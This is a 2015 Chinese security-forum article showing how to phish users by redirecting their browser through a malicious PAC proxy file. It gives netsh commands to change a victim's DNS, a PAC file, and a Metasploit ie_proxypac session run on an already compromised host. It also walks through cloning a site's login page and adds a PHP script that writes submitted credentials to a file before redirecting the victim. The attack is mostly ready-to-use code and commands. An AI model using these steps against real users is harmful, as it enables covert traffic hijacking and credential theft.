@@ -1,0 +1,63 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">通过.PAC进行网络钓鱼</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Evi1cg</a> <span class="bull">·</span> <time title="2015/09/21 10:21" ui-time="" datetime="2015/09/21 10:21" class="published ng-binding ng-isolate-scope">2015/09/21 10:21</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 常见网络钓鱼方式</h1><hr><p>攻击者进行网络钓鱼的方式常有以下几种:</p><p><strong>1</strong>. 通过修改受害者hosts文件(<code>C:\WINDOWS\system32\drivers\etc\hosts</code>)来实现；</p><p><strong>2</strong>. 通过修改受害者dns来实现；</p><p><strong>3</strong>. 已经进入路由器，直接修改路由器的DNS。</p><p>罗列的并不全，之后遇到的话再补充，上述三种方式很常见。</p><ol><li><p>修改HOSTS文件，即攻击者修改受害者HOSTS文件为如下形式：</p><p>127.0.0.1 localhost x.x.x.x www.wooyun.com</p></li></ol><p>这样就受害者访问www.wooyun.com会直接访问到x.x.x.x。在msf中可以使用<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/inject_host.rb">inject_host</a>脚本来实现。</p><ol><li><p>修改dns进行攻击：</p><p>攻击者可是使用如下命令修改受害者的dns地址(<code>管理员身份执行</code>)：</p><pre><code>C:\Windows\system32&gt;netsh interface ip show interfaces        
+
+Idx  Met   MTU   状态          名称
+---  ---  -----  -----------  -------------------
+  1   50 4294967295  connected    Loopback Pseudo-Interface 1
+ 10   10   1500  connected    本地连接        
+
+C:\Windows\system32&gt;netsh interface ip set dns "本地连接" static 192.168.1.100
+C:\Windows\system32&gt;ipconfig /all | findstr 192.168.1.100
+   DNS 服务器  . . . . . . . . . . . : 192.168.1.100
+</code></pre><p>这样就修改了受害者的DNS地址，之后可以使用msf的 <a href="http://www.rapid7.com/db/modules/auxiliary/server/fakedns">fakedns</a>来架设dns服务器来修改域名的解析地址。</p></li></ol><p>除了直接修改路由器的DNS地址的以上两种方式在某些环境下还是有一些缺点的，例如，一些牛逼的AV会检测到文件的修改而发出报警，除此之外，如果受害者所处内网环境中的防火墙或路由器拦截对外部的DNS请求，修改受害者DNS的攻击方式并不能生效（因为攻击者架设的DNS在外网环境下）。</p><h1>0x01 通过PAC代理</h1><hr><p>本文主要介绍的是Metasploit中的一个模块<a href="https://github.com/rapid7/metasploit-framework/blob/2bcdb1bec317f7659d1a1d7609db45f98d4d6df2/modules/post/windows/manage/ie_proxypac.rb">ie_proxypac</a>。通过<a href="http://baike.baidu.com/link?url=zxBitLRRy0pS4ux3SF_cWcauZIs2bhd4eETBFtYQz__4GqO0KBvVoBK5Ox-RS0HTn3Ma30AiFnz5aCbsVIOT5_">.PAC(自动配置代理)</a>文件来完全控制IE的用户流量。只需要修改PAC文件，攻击者就能使受害者访问的某个域名指向攻击者的IP。虽然没有修改DNS但是可以达到同样的效果，且这种方式较为隐蔽。<a href="https://www.securelist.com/en/analysis/204792308/PAC_the_Problem_Auto_Config">已经有很多人使用这种方式进行网络钓鱼</a>。</p><p>下面是一个PAC文件示例：</p><pre><code>function FindProxyForURL(url, host)
+{
+if (shExpMatch(host, "www.wooyun.org")) { 
+ return "PROXY 192.168.52.129:80; DIRECT";
+}
+if (shExpMatch(host, "www.baidu.com")) { 
+ return "PROXY 192.168.52.129:80; DIRECT";
+}
+}
+</code></pre><p>这个文件的配置是当受害者访问www.wooyun.com以及www.baidu.com时，他会直接请求到攻击者ip（ 192.168.52.129）。</p><blockquote><p>详细的PAC编写请查看http://findproxyforurl.com/pac-functions/。</p></blockquote><p>将以上脚本保存为test.pac，在获取meterpreter会话的基础上使用ie_proxypac脚本:</p><pre><code>#!bash
+meterpreter &gt; background 
+[*] Backgrounding session 1...
+msf &gt; use post/windows/manage/ie_proxypac 
+msf post(ie_proxypac) &gt; set session 1
+session =&gt; 1
+msf post(ie_proxypac) &gt; set REMOTE_PAC http://192.168.52.129/test.pac
+REMOTE_PAC =&gt; http://192.168.52.129/test.pac
+msf post(ie_proxypac) &gt; show options     
+
+Module options (post/windows/manage/ie_proxypac):    
+
+   Name           Current Setting         Required  Description
+   ----           ---------------         --------  -----------
+   AUTO_DETECT    false                           yes       Automatically detect settings.
+   DISABLE_PROXY  false                           yes       Disable the proxy server.
+   LOCAL_PAC                                      no        Local PAC file.
+   REMOTE_PAC     http://192.168.52.129/test.pac  no        Remote PAC file. (Ex: http://192.168.1.20/proxy.pac)
+   SESSION        1                               yes       The session to run this module on.
+msf post(ie_proxypac) &gt; exploit     
+
+[*] Setting automatic configuration script from local PAC file ...
+[+] Automatic configuration script configured...
+[*] Post module execution completed    
+</code></pre><p>之后打开ie，internet选项->连接->局域网设置：</p><p><img alt="Alt text" img-src="452034089bc40fc1d262ddd9be4b4f3684f7a587.jpg"></p><p>可以看到pac已经使用pac文件进行了代理。</p><blockquote><p>代理尽量使用<strong>远程代理</strong>，因为IE11默认禁止本地代理，如果使用本地代理，代理是无效的。<a href="http://blogs.msdn.com/b/ieinternals/archive/2013/10/11/web-proxy-configuration-and-ie11-changes.aspx">详情</a>测试发现，如果连接了vpn，pac代理是失效的。</p></blockquote><p>现在再访问<code>www.baidu.com</code>,<code>www.wooyun.org</code>，会看到已经转移到了我们制定的ip：</p><p><img alt="Alt text" img-src="77dd8277266916242794d5474aeccdf25f8b3be5.jpg"></p><h1>0x02 能做什么</h1><hr><p>这里我们修改pac文件如下：</p><pre><code>function FindProxyForURL(url, host)
+{
+if (shExpMatch(host, "www.wooyun.org")) { 
+ return "PROXY 192.168.52.129:80; DIRECT";
+}
+}
+</code></pre><p><strong>这里ip要改成自己的web的ip</strong>，如果受害者请求的网站host为 <code>www.wooyun.org</code> 时，满足规则，然后跳转到我们指定的ip地址，这里我们可以来构造钓鱼。</p><p>打开<a href="http://www.wooyun.org/">wooyun</a>,右键查看源代码，将所有源代码保存为index.html，放在网站根目录下，因为当受害者请求 <code>http://wooyun.org</code>，其host为 <code>wooyun.org</code> 不满足代理条件，就会直接请求，所以我们把源代码中的<code>www.wooyun.org</code>，改为<code>wooyun.org</code>:</p><p><img alt="Alt text" img-src="ae4abc8bbe6c1c1f0cb166a0523f7cd30e35eb6f.jpg"></p><p>然后找到url，src，href标签，修改为http://wooyun.org/xxxx 的形式，比如</p><pre><code>#!html
+&lt;link href="/css/style.css?v=201501291909" rel="stylesheet" type="text/css"/&gt;
+</code></pre><p>修改为</p><pre><code>#!html
+&lt;link href="http://wooyun.org/css/style.css?v=201501291909" rel="stylesheet" type="text/css"/&gt;
+</code></pre><p>改完以后，基本上就算克隆成功了：</p><p><img alt="Alt text" img-src="9b5495f592d1c188065715caed8060d120764c45.jpg"></p><p>下来要把登陆页面的的源码复制过来，打开<code>http://www.wooyun.org/user.php?action=login</code>，右键复制源码，保存为user.php，放在网站根目录下，修改源码中的url，src，href。修改完之后，打开index.html文件，定位<code>登录</code>，修改href为 <code>user.php?action=login</code>，修改以后此标签为：</p><pre><code>#!html
+&lt;a href="user.php?action=login"&gt;登录&lt;/a&gt; | &lt;a href="http://wooyun.org/user.php?action=register" class="reg"&gt;注册&lt;/a&gt;
+</code></pre><p>打开user.php,定位<code>用户登录</code>表单，修改表单action为post.php:</p><pre><code>#!html
+&lt;a href="#"&gt;用户登录&lt;/a&gt;&lt;/div&gt;
+        &lt;/div&gt;
+&lt;form action="post.php" method="POST"&gt;  
+.....
+</code></pre><p>在网站根目录新建post.php，添加如下代码：</p><pre><code>#!php
+&lt;?php $file = 'data.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?&gt;&lt;meta http-equiv="refresh" content="0; url=http://wooyun.org/user.php?action=login" /&gt;
+</code></pre><p>这样钓鱼站就搭建好了。</p><p>当用户登录时：</p><p><img alt="Alt text" img-src="ec1f858b69171588f7132c74e40cdc4255514f59.jpg"></p><p>点击登陆以后会跳转到<code>http://wooyun.org/user.php?action=login</code></p><p><img alt="Alt text" img-src="fe1e977ee24ea1c64bca22e72ccb292903740fa4.jpg"></p><p>查看data.txt:</p><p><img alt="Alt text" img-src="df51a639053db47be25eae70f0ea729f759210fa.jpg"></p><blockquote><p>只是简单地一个示例，具体可以通过修改pac文件来实现控制浏览器是否进行代理。</p></blockquote><h1>0x03 小结</h1><hr><p>此种方式进行网络钓鱼，做的细致的话，很难被发现，而且隐蔽性好，缺点就是连接vpn以后代理将会失效。以上是个人的测试结果，请各位大牛指正。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/509" rel="bookmark" id="re1">反向代理的有趣用法</a></li><li><a href="http://drops.wooyun.org/tips/870" rel="bookmark" id="re2">hackyou2014 CTF web关卡通关攻略</a></li><li><a href="http://drops.wooyun.org/tips/2460" rel="bookmark" id="re3">用Burpsuite 来处理csrf token</a></li><li><a href="http://drops.wooyun.org/tips/13556" rel="bookmark" id="re4">QQ模拟登录实现之四两拨千斤（基于V8引擎）</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我不告诉你</span> <span class="reply-time">2015-09-21 15:20:41</span></div><p></p><p>pac代理通常用来扶墙，只能代理部分网站的，你想代理那个网站，在pac文件里添加就行了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">一天到晚吃</span> <span class="reply-time">2015-09-21 13:43:00</span></div><p></p><p>学习了~~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2015-09-21 13:04:36</span></div><p></p><p>就是只对部分网站进行代理?</p><p></p></div></div></div></div></div></main>
